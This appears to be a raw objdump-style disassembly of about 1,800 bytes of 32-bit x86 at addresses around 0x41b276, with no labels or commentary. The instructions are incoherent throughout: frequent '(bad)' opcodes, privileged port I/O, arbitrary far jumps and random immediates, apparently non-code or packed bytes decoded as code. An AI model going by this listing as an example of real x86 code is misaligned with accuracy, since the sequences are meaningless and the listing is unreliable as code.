  41b276:	cld    
  41b277:	mov    DWORD PTR [edx-0x3b7a3788],ecx
  41b27d:	cwde   
  41b27e:	iret   
  41b27f:	aas    
  41b280:	dec    esp
  41b281:	mov    edx,0xae24da3
  41b286:	std    
  41b287:	mov    bl,0xa5
  41b289:	imul   edi,ecx,0x4abdcde8
  41b28f:	mov    ch,0x36
  41b291:	cld    
  41b292:	adc    al,0x69
  41b294:	dec    ebp
  41b295:	test   bl,ah
  41b297:	mov    ss,WORD PTR [eax-0x637cc4bf]
  41b29d:	enter  0xffa1,0x5e
  41b2a1:	pop    esi
  41b2a2:	ss add eax,0x948a9a7e
  41b2a8:	cld    
  41b2a9:	mov    esp,0x86df9a31
  41b2ae:	mov    al,0x3b
  41b2b0:	mov    dl,0x5f
  41b2b2:	pop    eax
  41b2b3:	imul   edx,ecx,0xffffffc0
  41b2b6:	mov    ds:0xeef7adaa,eax
  41b2bb:	jp     0x41b30e
  41b2bd:	leave  
  41b2be:	mov    ecx,0x4dfb359
  41b2c3:	in     eax,dx
  41b2c4:	adc    eax,0x234d693c
  41b2c9:	push   ds
  41b2ca:	xchg   BYTE PTR [eax-0x16d0893f],ah
  41b2d0:	cmp    esi,DWORD PTR [edi+0x3cc05372]
  41b2d6:	fs xchg esp,eax
  41b2d8:	jb     0x41b341
  41b2da:	mov    edx,0xb6098365
  41b2df:	sub    eax,0x1e6b513f
  41b2e4:	sbb    BYTE PTR [edx-0x34b8c912],dl
  41b2ea:	retf   0xdc78
  41b2ed:	push   cs
  41b2ee:	sub    dh,bl
  41b2f0:	push   cs
  41b2f1:	sar    edi,1
  41b2f3:	pop    edx
  41b2f4:	xchg   edi,eax
  41b2f5:	out    dx,eax
  41b2f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2f7:	mov    ecx,0x31663717
  41b2fc:	loop   0x41b359
  41b2fe:	jb     0x41b347
  41b300:	jne    0x41b291
  41b302:	xchg   DWORD PTR [edx],ebx
  41b304:	imul   esp,DWORD PTR [edx],0xffffffe9
  41b307:	add    eax,0x8ff7f0af
  41b30c:	daa    
  41b30d:	mov    fs,WORD PTR [eax+ebp*2]
  41b310:	pop    esp
  41b311:	sti    
  41b312:	in     al,dx
  41b313:	lock mov ds:0x2bf87e90,al
  41b319:	ss (bad) 
  41b31b:	inc    eax
  41b31c:	mov    DWORD PTR [edx],edx
  41b31e:	and    cl,ch
  41b320:	ss push ebp
  41b322:	ret    
  41b323:	jns    0x41b2b1
  41b325:	rcr    ecx,cl
  41b327:	push   ecx
  41b328:	(bad)  
  41b32a:	lods   eax,DWORD PTR ds:[esi]
  41b32b:	scas   eax,DWORD PTR es:[edi]
  41b32c:	scas   eax,DWORD PTR es:[edi]
  41b32d:	lods   al,BYTE PTR ds:[esi]
  41b32e:	jnp    0x41b304
  41b330:	or     BYTE PTR [ecx-0x48],bh
  41b333:	ja     0x41b334
  41b335:	out    dx,eax
  41b336:	retf   
  41b337:	jbe    0x41b30d
  41b339:	cmp    BYTE PTR [esi+eiz*2+0x66f2dac4],0xfc
  41b341:	retf   
  41b342:	cwde   
  41b343:	aaa    
  41b344:	outs   dx,BYTE PTR ds:[esi]
  41b345:	sbb    al,0xa9
  41b347:	pop    es
  41b348:	cmp    DWORD PTR [eax-0x527740d3],0xffffffda
  41b34f:	xchg   ebp,eax
  41b350:	pop    esi
  41b351:	xor    ecx,edx
  41b353:	(bad)  
  41b354:	jmp    0x287a:0x175e7425
  41b35b:	pop    ebx
  41b35d:	ds shl esi,cl
  41b360:	mov    ebp,DWORD PTR [ebx-0x6d]
  41b363:	fcmovnbe st,st(4)
  41b365:	dec    ebx
  41b366:	jl     0x41b318
  41b368:	sub    bh,BYTE PTR [ebx]
  41b36a:	clc    
  41b36b:	int    0x85
  41b36d:	fst    st(0)
  41b36f:	adc    eax,0x1dd8fba
  41b374:	retf   0x7194
  41b377:	pop    esp
  41b378:	and    ah,BYTE PTR [eax-0x71775f0d]
  41b37e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b37f:	and    eax,DWORD PTR [esi]
  41b381:	mov    ebp,0x271aef85
  41b386:	cmp    ah,BYTE PTR [edi]
  41b388:	ror    BYTE PTR ds:0x7960f0c1,cl
  41b38e:	mov    eax,ds:0x37ef1481
  41b393:	scas   al,BYTE PTR es:[edi]
  41b394:	pop    ebx
  41b395:	inc    ebp
  41b396:	adc    eax,0x8d772427
  41b39b:	mov    dl,0xaf
  41b39d:	mov    esi,0x1ba21ac
  41b3a2:	in     al,dx
  41b3a3:	sub    eax,0x95525d3a
  41b3a8:	lods   eax,DWORD PTR ds:[esi]
  41b3a9:	mov    bl,0xfb
  41b3ab:	sbb    al,BYTE PTR [esi-0x23]
  41b3ae:	icebp  
  41b3af:	hlt    
  41b3b0:	xchg   ecx,eax
  41b3b1:	dec    ebp
  41b3b2:	aam    0xd5
  41b3b4:	mov    esi,0x610895aa
  41b3b9:	dec    edi
  41b3ba:	jmp    0x7320:0xba8ca57b
  41b3c1:	xlat   BYTE PTR ds:[ebx]
  41b3c2:	or     al,0xb
  41b3c4:	sbb    al,0x50
  41b3c6:	xor    ch,BYTE PTR [esi+0x7c]
  41b3c9:	xchg   edx,eax
  41b3ca:	jns    0x41b3ab
  41b3cc:	test   dh,bh
  41b3ce:	xchg   esp,eax
  41b3cf:	adc    edi,edx
  41b3d1:	or     al,BYTE PTR [edx-0x1c]
  41b3d4:	test   al,0x9e
  41b3d6:	ins    DWORD PTR es:[edi],dx
  41b3d7:	arpl   ax,di
  41b3d9:	jno    0x41b35b
  41b3db:	push   ebx
  41b3dc:	dec    esp
  41b3dd:	cmp    DWORD PTR [esi],edi
  41b3df:	sbb    eax,0x32465c90
  41b3e4:	xor    BYTE PTR ds:0x76aea38d,dl
  41b3ea:	mov    dl,0x96
  41b3ec:	retf   
  41b3ed:	mov    ebp,0x3e571799
  41b3f2:	add    ebx,ecx
  41b3f4:	out    dx,eax
  41b3f5:	and    cl,BYTE PTR [ecx]
  41b3f7:	pushf  
  41b3f8:	xor    DWORD PTR ds:0x178b56bf,0x5d5d4d36
  41b402:	scas   eax,DWORD PTR es:[edi]
  41b403:	or     BYTE PTR [ebp-0x32f9afb5],ah
  41b409:	xchg   ecx,eax
  41b40a:	push   es
  41b40b:	stc    
  41b40c:	(bad)  
  41b40d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b40e:	adc    esi,ecx
  41b410:	mov    ebx,0x3aa5505c
  41b415:	pop    edi
  41b416:	out    0xe4,eax
  41b418:	js     0x41b3ef
  41b41a:	scas   eax,DWORD PTR es:[edi]
  41b41b:	in     eax,0xf3
  41b41d:	pop    ebx
  41b41e:	pop    es
  41b41f:	nop
  41b420:	mov    edx,0xd57227d4
  41b425:	pop    ecx
  41b426:	dec    esp
  41b427:	push   ecx
  41b428:	imul   ebx,DWORD PTR [edi],0xffffffcb
  41b42b:	scas   eax,DWORD PTR es:[edi]
  41b42c:	adc    BYTE PTR [edi],bh
  41b42e:	dec    ebp
  41b42f:	mov    ds:0x97265564,eax
  41b434:	jne    0x41b455
  41b436:	cmp    DWORD PTR [edx+eiz*2+0x65],eax
  41b43a:	xor    ah,BYTE PTR [esi-0x60]
  41b43d:	inc    eax
  41b43e:	sbb    al,BYTE PTR [ebx]
  41b440:	cmp    ebx,DWORD PTR ds:[ebx+0x10]
  41b444:	adc    al,0xa0
  41b446:	mov    ds:0x10deca2f,al
  41b44b:	into   
  41b44c:	pushf  
  41b44d:	sar    DWORD PTR [ebx],cl
  41b44f:	cmp    al,0xf2
  41b451:	mov    ch,0x4f
  41b453:	push   eax
  41b454:	outs   dx,BYTE PTR ds:[esi]
  41b455:	cdq    
  41b456:	mov    ecx,esp
  41b458:	mov    ds:0xf0af7c90,eax
  41b45d:	loop   0x41b3df
  41b45f:	dec    edi
  41b460:	push   esp
  41b461:	mov    ebp,0x8cae0f09
  41b466:	cmp    dh,ch
  41b468:	and    eax,0xcdc5e90f
  41b46d:	sub    DWORD PTR [ebx],ebp
  41b46f:	sub    BYTE PTR [edx],ah
  41b471:	inc    ebp
  41b472:	xchg   esi,eax
  41b473:	sbb    ebx,DWORD PTR [edi-0x2d4ad39f]
  41b479:	dec    ebx
  41b47a:	push   edi
  41b47b:	mov    esi,0xaf892c0c
  41b480:	fld    TBYTE PTR [edx]
  41b482:	pop    ebp
  41b483:	pop    ebp
  41b484:	or     ah,dl
  41b486:	xchg   ebx,eax
  41b487:	rcl    DWORD PTR [ebx+esi*4],cl
  41b48a:	sub    al,0x3a
  41b48c:	inc    ebx
  41b48d:	lods   eax,DWORD PTR ds:[esi]
  41b48e:	aas    
  41b48f:	xlat   BYTE PTR ds:[ebx]
  41b490:	add    ch,BYTE PTR [ecx-0x72]
  41b493:	mov    cl,0x3e
  41b495:	jno    0x41b515
  41b497:	in     eax,0x30
  41b499:	mov    ds:0x81d83894,eax
  41b49e:	lock loop 0x41b4ca
  41b4a1:	in     eax,dx
  41b4a2:	fwait
  41b4a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4a4:	push   edx
  41b4a5:	mov    ds:0xa60c5181,al
  41b4aa:	das    
  41b4ab:	xchg   edi,eax
  41b4ac:	sub    BYTE PTR [esi],ch
  41b4ae:	cmp    eax,0x3eae8e6
  41b4b3:	mov    dl,BYTE PTR [edx+0x146b02cb]
  41b4b9:	push   0x1e01c74a
  41b4be:	shr    BYTE PTR [eax],0x92
  41b4c1:	and    BYTE PTR ds:0x1a8b276c,ch
  41b4c7:	dec    ecx
  41b4c8:	mov    edi,0xaa2da03e
  41b4cd:	ins    DWORD PTR es:[edi],dx
  41b4ce:	sti    
  41b4cf:	addr16 rol ebp,1
  41b4d2:	mov    ds:0x7818171b,eax
  41b4d7:	or     DWORD PTR [esp+ecx*2+0x71],edx
  41b4db:	fild   WORD PTR [ecx+eiz*2]
  41b4de:	rol    BYTE PTR [eax+edi*1],1
  41b4e1:	das    
  41b4e2:	imul   eax,DWORD PTR [esi+0x40708fca],0x9c2cd561
  41b4ec:	adc    al,0xac
  41b4ee:	rol    BYTE PTR ds:0x247e2577,cl
  41b4f4:	xor    al,0xa2
  41b4f6:	jecxz  0x41b4c0
  41b4f8:	js     0x41b56f
  41b4fa:	adc    al,ah
  41b4fc:	(bad)  
  41b4fd:	icebp  
  41b4fe:	xchg   BYTE PTR [edx+0xda454a8],al
  41b504:	xchg   esi,eax
  41b505:	sub    DWORD PTR [ecx+0x279519f5],edi
  41b50b:	jmp    0xc9d3d980
  41b510:	mov    dh,0x34
  41b512:	imul   esi,ecx,0xfffffff4
  41b515:	dec    esi
  41b516:	outs   dx,BYTE PTR ds:[esi]
  41b517:	pop    ebx
  41b518:	mov    ds:0x26a16a6d,eax
  41b51d:	imul   esi,DWORD PTR [eax+0x7b],0xffffff99
  41b521:	sbb    al,0x18
  41b523:	adc    DWORD PTR [eax-0x7576b33b],0xffffffac
  41b52a:	adc    BYTE PTR [edi],0x9d
  41b52d:	gs test eax,0xa4b59a39
  41b533:	xor    eax,0x84bb8ed
  41b538:	lock mov al,0xf2
  41b53b:	dec    esp
  41b53c:	std    
  41b53d:	icebp  
  41b53e:	or     ch,BYTE PTR [ecx+edi*8]
  41b541:	or     ax,0xc86f
  41b545:	jbe    0x41b5af
  41b547:	sub    DWORD PTR [esp+esi*1-0x24],0x66fa6bed
  41b54f:	jae    0x41b51e
  41b551:	xchg   ebx,eax
  41b552:	and    al,BYTE PTR [ebx]
  41b554:	les    eax,FWORD PTR ds:0xcd405f02
  41b55a:	ja     0x41b594
  41b55c:	pop    eax
  41b55d:	push   esi
  41b55e:	adc    al,0x88
  41b560:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41b562:	pop    ds
  41b563:	xchg   edx,eax
  41b564:	push   cs
  41b565:	mov    dl,0xec
  41b567:	jb     0x41b508
  41b569:	xchg   ebp,eax
  41b56a:	xchg   ebp,eax
  41b56b:	scas   eax,DWORD PTR es:[edi]
  41b56c:	(bad)  
  41b56d:	dec    esi
  41b56e:	inc    esi
  41b56f:	je     0x41b53c
  41b571:	ja     0x41b520
  41b573:	fidivr DWORD PTR [ecx-0x543fb1dc]
  41b579:	xchg   esp,eax
  41b57a:	popa   
  41b57b:	psubsb mm1,QWORD PTR ds:[edx+0x9]
  41b580:	sub    BYTE PTR [edx-0x26],ah
  41b583:	mov    BYTE PTR [ecx-0x5a],dl
  41b586:	ds in  eax,dx
  41b588:	(bad)  
  41b589:	jmp    0xed46:0xc577c4ef
  41b590:	xchg   DWORD PTR [ecx],esp
  41b592:	shl    edx,1
  41b594:	mov    ds:0xf69ab04f,al
  41b599:	sub    al,0x8b
  41b59b:	and    eax,0xa3f33721
  41b5a0:	push   ebx
  41b5a1:	lock cmp bl,BYTE PTR [ecx-0xf]
  41b5a5:	(bad)  
  41b5a6:	stc    
  41b5a7:	mov    cl,al
  41b5a9:	scas   al,BYTE PTR es:[edi]
  41b5aa:	fstp   DWORD PTR [eax]
  41b5ac:	sub    eax,0xa739621b
  41b5b1:	retf   
  41b5b2:	adc    eax,0x45931344
  41b5b7:	jle    0x41b547
  41b5b9:	mov    eax,ds:0x8b66b373
  41b5be:	push   esp
  41b5bf:	xchg   edi,eax
  41b5c0:	add    eax,0x90844516
  41b5c5:	xor    DWORD PTR [edx+0x4b264814],eax
  41b5cb:	lock xor DWORD PTR [ebp+esi*8+0x25],0x38f7f245
  41b5d4:	(bad)  
  41b5d5:	sub    DWORD PTR [ebx+0x54],ebp
  41b5d8:	fdivr  DWORD PTR [eax+0x69f35ed2]
  41b5de:	(bad)  
  41b5df:	sbb    BYTE PTR [ebx],al
  41b5e1:	sub    al,0x8
  41b5e3:	inc    edi
  41b5e4:	and    DWORD PTR [ebx+0x18],ebp
  41b5e7:	iret   
  41b5e8:	xchg   ebx,eax
  41b5e9:	icebp  
  41b5ea:	gs and dl,ah
  41b5ed:	jno    0x1853355b
  41b5f3:	div    bh
  41b5f5:	sbb    BYTE PTR [ebx],dl
  41b5f7:	add    BYTE PTR [ecx],bl
  41b5f9:	add    eax,0x56f0b1b0
  41b5fe:	xor    BYTE PTR [edx-0x41],dh
  41b601:	mov    dl,0x63
  41b603:	xchg   ebx,eax
  41b604:	(bad)  
  41b605:	rcr    ebp,1
  41b607:	es cld 
  41b609:	in     al,dx
  41b60a:	dec    ebx
  41b60b:	add    BYTE PTR [edi+0x42],dh
  41b60e:	cmp    eax,0x9649b37f
  41b613:	int    0xe9
  41b615:	mov    cl,0x10
  41b617:	pop    ss
  41b618:	or     ecx,0x9c16b513
  41b61e:	jmp    0x41b5ef
  41b620:	sub    dl,BYTE PTR [ecx+0x60]
  41b623:	shr    eax,0x79
  41b626:	and    edx,esi
  41b628:	mov    ebx,0xc88664cd
  41b62d:	sub    al,0xd8
  41b62f:	int    0x87
  41b631:	pop    ss
  41b632:	and    al,0xe9
  41b634:	sbb    eax,0xdfc3a373
  41b639:	cmp    eax,0xd3dc0c1d
  41b63e:	sbb    esi,eax
  41b640:	adc    ebx,DWORD PTR [ecx+0x6]
  41b643:	call   0xf9da:0xce8d85ef
  41b64a:	mov    DWORD PTR [eax-0x6d],esi
  41b64d:	jns    0x41b641
  41b64f:	cmp    bl,BYTE PTR [eax-0x28]
  41b652:	sub    bl,cl
  41b654:	push   ebx
  41b655:	imul   esp,DWORD PTR [edx-0x4eebe412],0x48c9b288
  41b65f:	add    cl,BYTE PTR [ebx]
  41b661:	jo     0x41b681
  41b663:	pop    edx
  41b664:	sahf   
  41b665:	and    DWORD PTR [ebp+0x5],ebx
  41b668:	test   al,0xb5
  41b66a:	leave  
  41b66b:	das    
  41b66c:	scas   al,BYTE PTR es:[edi]
  41b66d:	call   0x8289:0x52e26004
  41b674:	out    dx,eax
  41b675:	xchg   ecx,eax
  41b676:	dec    edx
  41b677:	out    dx,al
  41b678:	jp     0x41b6f7
  41b67a:	mov    esp,0x9766840c
  41b67f:	mov    al,0x88
  41b681:	xchg   ecx,edx
  41b683:	in     eax,dx
  41b684:	cmc    
  41b685:	xchg   esi,eax
  41b686:	or     DWORD PTR [ecx+0x66],0xffffffac
  41b68a:	repnz enter 0xe8d2,0x78
  41b68f:	xchg   esp,eax
  41b690:	shl    DWORD PTR [edi-0x7c],0x4
  41b694:	mov    ebx,0xe0b7dae2
  41b699:	lahf   
  41b69a:	push   0x49
  41b69c:	xor    eax,0x4bceb0a9
  41b6a1:	enter  0x3b3b,0x5c
  41b6a5:	pusha  
  41b6a6:	jg     0x41b6a1
  41b6a8:	mov    eax,0x7600b259
  41b6ad:	pop    edi
  41b6ae:	outs   dx,DWORD PTR ds:[esi]
  41b6af:	popa   
  41b6b0:	jnp    0x41b68d
  41b6b2:	mov    dh,0x97
  41b6b4:	xchg   ecx,eax
  41b6b5:	mov    bh,0x9a
  41b6b7:	mov    BYTE PTR ds:0xc454d554,bl
  41b6bd:	mov    fs,ecx
  41b6bf:	mov    al,0x1b
  41b6c1:	stos   DWORD PTR es:[edi],eax
  41b6c2:	or     eax,0x5544a408
  41b6c7:	xchg   ecx,eax
  41b6c8:	sub    ch,BYTE PTR [ebp+0x616b5984]
  41b6ce:	mov    eax,DWORD PTR [edi+0x24799ad6]
  41b6d4:	cmp    BYTE PTR [ebp-0x4c],dh
  41b6d7:	mov    ds:0x561994d5,eax
  41b6dc:	jns    0x41b674
  41b6de:	cmp    eax,0x94cb8a11
  41b6e3:	std    
  41b6e4:	jle    0x41b6e3
  41b6e6:	dec    esp
  41b6e7:	jecxz  0x41b721
  41b6e9:	xor    al,0x3b
  41b6eb:	in     eax,dx
  41b6ec:	mov    dl,0x23
  41b6ee:	shl    DWORD PTR [eax],1
  41b6f0:	and    BYTE PTR [ecx+0x17d2d1a],bl
  41b6f6:	mov    ebx,0x58fa6962
  41b6fb:	je     0x41b6fc
  41b6fd:	dec    esp
  41b6fe:	jg     0x41b6d0
  41b700:	mov    DWORD PTR [ecx],edi
  41b702:	loopne 0x41b6a5
  41b704:	in     al,0x66
  41b706:	ins    DWORD PTR es:[edi],dx
  41b707:	sar    BYTE PTR ds:0xbd276607,cl
  41b70d:	int    0x7f
  41b70f:	push   cs
  41b710:	outs   dx,BYTE PTR ds:[esi]
  41b711:	fcomp  QWORD PTR [ecx-0x889f4b1]
  41b717:	pop    ebx
  41b718:	adc    ch,BYTE PTR [edx+eiz*8-0x52bb0bcd]
  41b71f:	aaa    
  41b720:	in     al,dx
  41b721:	jle    0x41b704
  41b723:	repz jns 0x41b6dd
  41b726:	or     eax,0xcd3ef4a1
  41b72b:	jns    0x41b77f
  41b72d:	jecxz  0x41b791
  41b72f:	fiadd  DWORD PTR [eax]
  41b731:	scas   al,BYTE PTR es:[edi]
  41b732:	std    
  41b733:	cmp    BYTE PTR [ebx+0x4a479e02],ch
  41b739:	xor    ebp,DWORD PTR [eax+0x55adbbe7]
  41b73f:	les    esi,FWORD PTR [edx-0x19]
  41b742:	jle    0x41b77b
  41b744:	xchg   ebx,eax
  41b745:	dec    ebp
  41b746:	jecxz  0x41b781
  41b748:	repnz shl sp,cl
  41b74c:	fimul  DWORD PTR [esi]
  41b74e:	jg     0x41b749
  41b750:	rol    bh,0xb5
  41b753:	out    dx,eax
  41b754:	xchg   edi,eax
  41b755:	pusha  
  41b756:	pop    esi
  41b757:	call   0x5d0d:0x6870
  41b75d:	or     al,0x7a
  41b75f:	inc    dh
  41b761:	in     al,0x1b
  41b763:	xchg   ebx,eax
  41b764:	fisub  DWORD PTR [edx-0x7fe3060f]
  41b76a:	mov    bl,0x52
  41b76c:	add    eax,0x64b0d9a9
  41b771:	ss pusha 
  41b773:	sub    al,0x27
  41b775:	lods   eax,DWORD PTR ds:[esi]
  41b776:	xchg   edi,eax
  41b777:	rol    DWORD PTR [ecx],0x1
  41b77a:	pusha  
  41b77b:	imul   ecx,DWORD PTR [esi-0x1ee40938],0x20
  41b782:	dec    edx
  41b783:	mov    eax,0xce984c43
  41b788:	cmp    BYTE PTR [edx+0x7cf96828],al
  41b78e:	jmp    edi
  41b790:	sub    DWORD PTR [ebp-0x21],0xac7e34bb
  41b797:	add    BYTE PTR [esi+0x46d3bd4e],al
  41b79d:	loop   0x41b7e1
  41b79f:	dec    edi
  41b7a0:	jmp    0x488b:0xd3d25cf0
  41b7a7:	icebp  
  41b7a8:	inc    eax
  41b7a9:	test   DWORD PTR [eax+ebp*4+0x1],eax
  41b7ad:	out    0xfb,al
  41b7af:	sbb    dl,BYTE PTR [edi+0x74a5840c]
  41b7b5:	sbb    BYTE PTR [esi+0x3a],ah
  41b7b8:	repz inc edi
  41b7ba:	fiadd  DWORD PTR [ebp-0x36]
  41b7bd:	repz push ebp
  41b7bf:	xor    ebx,edi
  41b7c1:	sbb    BYTE PTR [ecx-0x62],cl
  41b7c4:	js     0x41b826
  41b7c6:	or     al,BYTE PTR [eax-0x67ca0ea4]
  41b7cc:	ins    DWORD PTR es:[edi],dx
  41b7cd:	cdq    
  41b7ce:	in     eax,0x95
  41b7d0:	fmul   QWORD PTR ds:0xf69ad50f
  41b7d6:	stos   DWORD PTR es:[edi],eax
  41b7d7:	ret    
  41b7d8:	ret    0x9434
  41b7db:	sahf   
  41b7dc:	(bad)  
  41b7dd:	shl    DWORD PTR [eax+0x7a],1
  41b7e0:	repnz pop esi
  41b7e2:	mov    esp,0xbe062c93
  41b7e7:	stc    
  41b7e8:	inc    edi
  41b7e9:	div    BYTE PTR [ecx-0x80]
  41b7ec:	outs   dx,BYTE PTR ds:[esi]
  41b7ed:	fsub   st(3),st
  41b7ef:	jmp    0x1a1af6db
  41b7f4:	fldlg2 
  41b7f6:	mov    esi,0x823f8a4a
  41b7fb:	(bad)  
  41b7fd:	rcr    BYTE PTR [edi+0x1a819a63],cl
  41b803:	pop    es
  41b804:	stc    
  41b805:	mov    edi,0xc766885
  41b80a:	es repz and al,0x5d
  41b80e:	cmc    
  41b80f:	xchg   ebx,eax
  41b810:	mov    esi,edi
  41b812:	or     al,0xc2
  41b814:	adc    dl,BYTE PTR [ecx+0x43]
  41b817:	xchg   DWORD PTR ds:0xb464a174,ebp
  41b81d:	mov    ah,0x28
  41b81f:	(bad)  
  41b820:	mul    cl
  41b822:	inc    eax
  41b823:	sbb    al,bh
  41b825:	push   ebx
  41b826:	sub    dl,ah
  41b828:	fs mov esi,0xf836f707
  41b82e:	(bad)  
  41b82f:	sbb    al,0x3a
  41b831:	pop    eax
  41b832:	in     al,0xfe
  41b834:	data16 in al,0x64
  41b837:	mov    esi,0x4cf6456
  41b83c:	or     eax,0xf08f2519
  41b841:	jns    0x41b87a
  41b843:	punpckhwd mm7,QWORD PTR [esi-0x14]
  41b847:	enter  0x31bc,0x91
  41b84b:	adc    cl,dl
  41b84d:	ins    BYTE PTR es:[edi],dx
  41b84e:	pop    eax
  41b84f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b850:	dec    ebp
  41b851:	mov    ah,0x2f
  41b853:	(bad)  
  41b854:	pop    edx
  41b855:	into   
  41b856:	dec    edi
  41b857:	add    al,0x31
  41b859:	cmp    al,0x65
  41b85b:	mov    dh,0xb4
  41b85d:	psubb  mm3,QWORD PTR [eax-0x6f]
  41b861:	pop    esi
  41b862:	enter  0xdc1d,0x53
  41b866:	jmp    0x4063:0x964f2100
  41b86d:	rol    BYTE PTR [esi+0x57],0x41
  41b871:	and    BYTE PTR [esi],al
  41b873:	cmc    
  41b874:	scas   eax,DWORD PTR es:[edi]
  41b875:	fwait
  41b876:	loop   0x41b87f
  41b878:	inc    esi
  41b879:	je     0x41b82e
  41b87b:	cmp    edi,DWORD PTR [ecx+ebp*8+0x67]
  41b87f:	lea    ebx,[edi+0x7]
  41b882:	fiadd  WORD PTR [eax+ebp*1+0x5c]
  41b886:	push   ebx
  41b887:	dec    ecx
  41b888:	into   
  41b889:	push   esi
  41b88a:	sbb    eax,0x9e7aa35e
  41b88f:	mov    ebx,esi
  41b891:	scas   al,BYTE PTR es:[edi]
  41b892:	ins    DWORD PTR es:[edi],dx
  41b893:	mov    esi,0x53d7b119
  41b898:	mov    esi,0xd369f574
  41b89d:	call   0x245b:0xbcb624fb
  41b8a4:	scas   eax,DWORD PTR es:[edi]
  41b8a5:	push   ebp
  41b8a6:	sar    al,0xf5
  41b8a9:	call   0x386c:0x3cd8c97e
  41b8b0:	popa   
  41b8b1:	icebp  
  41b8b2:	test   al,0x24
  41b8b4:	ss pop edi
  41b8b6:	mul    ch
  41b8b8:	and    esp,ebp
  41b8ba:	and    eax,0x4b3bc486
  41b8bf:	cmp    eax,0x3624e2cd
  41b8c4:	cmp    al,0x2d
  41b8c6:	test   DWORD PTR [edx],ecx
  41b8c8:	dec    edx
  41b8c9:	sbb    BYTE PTR [eax-0x1f],dh
  41b8cc:	aam    0x8d
  41b8ce:	ss call 0xf6d6af99
  41b8d4:	pop    edx
  41b8d5:	pop    ss
  41b8d6:	adc    al,0x2e
  41b8d8:	out    0x60,al
  41b8da:	ret    
  41b8db:	iretw  
  41b8dd:	add    DWORD PTR [edx-0x10],eax
  41b8e0:	pop    edx
  41b8e1:	mov    ch,0x88
  41b8e3:	xor    eax,0x9975d5c0
  41b8e8:	mov    al,ds:0xa25a3746
  41b8ed:	sahf   
  41b8ee:	adc    al,0xd0
  41b8f0:	pop    ecx
  41b8f1:	adc    DWORD PTR [edi-0x57490b8c],edi
  41b8f7:	mov    ah,0x1
  41b8f9:	dec    ebp
  41b8fa:	hlt    
  41b8fb:	int3   
  41b8fc:	add    esi,esi
  41b8fe:	add    esi,DWORD PTR [ecx-0x53]
  41b901:	mov    ch,0xa
  41b903:	or     ch,BYTE PTR [edx+0x2a]
  41b906:	dec    edx
  41b907:	daa    
  41b908:	loope  0x41b964
  41b90a:	pop    ebp
  41b90b:	cdq    
  41b90c:	(bad)  
  41b90d:	repz data16 fsubr QWORD PTR [edx+0x16]
  41b912:	into   
  41b913:	(bad)  
  41b914:	rsqrtps xmm6,XMMWORD PTR [ebx-0x6ca2a82b]
  41b91b:	cmp    DWORD PTR [ebp-0x20],0x6c
  41b91f:	fld    TBYTE PTR [eax-0x55cbd820]
  41b925:	in     eax,0xf9
  41b927:	out    dx,eax
  41b928:	dec    esp
  41b929:	xor    al,0x3b
  41b92b:	out    dx,al
  41b92c:	imul   ebp,DWORD PTR [ecx],0x69fef38b
  41b932:	mov    dh,0x6
  41b934:	icebp  
  41b935:	dec    ebx
  41b936:	aas    
  41b937:	in     eax,0xff
  41b939:	les    esp,FWORD PTR [ecx]
  41b93b:	push   eax
  41b93c:	pop    edx
  41b93d:	ins    BYTE PTR es:[edi],dx
  41b93e:	add    dh,BYTE PTR [ecx+0x6d]
  41b941:	arpl   WORD PTR [edi+eiz*1],bx
  41b944:	es jae 0x41b9ba
  41b947:	jns    0x41b95e
  41b949:	or     bl,dl
  41b94b:	inc    esp
  41b94c:	lock arpl WORD PTR [esi+0x7874fd0d],bp
  41b953:	mov    ah,0xfb
  41b955:	das    
  41b956:	inc    edi
  41b957:	inc    eax
  41b958:	and    eax,0x518ea88f
  41b95d:	cdq    
  41b95e:	out    0x6d,eax
  41b960:	sub    eax,0xb050d195
  41b965:	(bad)  
  41b966:	rcr    bh,1
  41b968:	fwait
  41b969:	mov    eax,0xeaaf122d
  41b96e:	pop    edx
  41b96f:	xor    bh,dl
  41b971:	ins    DWORD PTR es:[edi],dx
  41b972:	or     DWORD PTR [ebp-0x4685ef9a],ebx
  41b978:	ret    0xe86f
  41b97b:	inc    ecx
  41b97c:	ja     0x41b920
  41b97e:	mov    esi,0x704a9d5e
  41b983:	add    eax,0xd8199762
  41b988:	xor    eax,0x1a8ad6f3
  41b98d:	cs adc eax,0x62d9457d
  41b993:	stc    
  41b994:	das    
  41b995:	sbb    dh,BYTE PTR [eax+0x23]
  41b998:	push   0xffffff80
  41b99a:	mul    BYTE PTR [esi+edx*4]
  41b99d:	rol    DWORD PTR [eax],1
  41b99f:	mov    dl,0xe2
  41b9a1:	push   es
  41b9a2:	repz mov cs,WORD PTR [eax+0x8c17db3]
  41b9a9:	xchg   esi,eax
  41b9aa:	dec    esp
  41b9ab:	adc    edx,esp
  41b9ad:	push   ecx
  41b9ae:	jmp    0x41b988
  41b9b0:	push   0xffffffcf
  41b9b2:	push   ebx
  41b9b3:	xchg   DWORD PTR [ebx],ebx
  41b9b5:	adc    BYTE PTR [edi-0x50708d98],0xa1
  41b9bc:	xchg   edi,eax
  41b9bd:	scas   eax,DWORD PTR es:[edi]
  41b9be:	aaa    
  41b9bf:	inc    esi
  41b9c0:	stos   DWORD PTR es:[edi],eax
  41b9c1:	sub    dh,BYTE PTR [edi]
  41b9c3:	adc    al,0xc5
  41b9c5:	fstp   DWORD PTR [edi+eax*8+0x2b]
  41b9c9:	clc    
  41b9ca:	lds    ebp,FWORD PTR [eax+ebp*4]
  41b9cd:	xor    DWORD PTR [edx+0x20],0x43
  41b9d1:	pop    esp
  41b9d2:	pop    esi
  41b9d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9d4:	or     BYTE PTR [ebx],dh
  41b9d6:	imul   edx,DWORD PTR [ebx],0x5e8012b0
  41b9dc:	mov    esp,0xfc17b83c
  41b9e1:	push   0x1a
  41b9e3:	ja     0x41b9f1
  41b9e5:	das    
  41b9e6:	lahf   
  41b9e7:	jmp    0xfaaa36ba
  41b9ec:	mov    ebx,0x856f0e8a
  41b9f1:	dec    ebx
  41b9f2:	xchg   ecx,eax
  41b9f3:	mov    cl,0xac
  41b9f5:	jecxz  0x41ba32
  41b9f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9f8:	inc    ecx
